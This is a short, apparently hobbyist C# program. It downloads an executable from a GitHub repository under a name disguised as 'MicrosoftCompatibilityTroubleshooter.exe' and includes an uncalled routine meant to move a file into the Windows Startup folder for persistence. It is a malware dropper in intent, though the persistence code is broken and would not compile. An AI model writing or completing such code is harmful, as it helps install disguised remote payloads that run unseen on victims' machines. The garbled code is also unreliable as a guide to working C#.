﻿using System.Net;
using System.IO;



static void main()
{

    using (var client = new WebClient())
    {
        client.DownloadFile("https://github.com/LionHackerman/whip/raw/main/WindowsCompatibilityTroubeshooter.exe", "MicrosoftCompatibilityTroubleshooter.exe");
    }

    void MoveNRun()
    {
        string downloadedPath = Environment.GetFolderPath(Enviroment.);
        string StartUp = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        File.Move(downloadedPath, StartUp);
    }

}
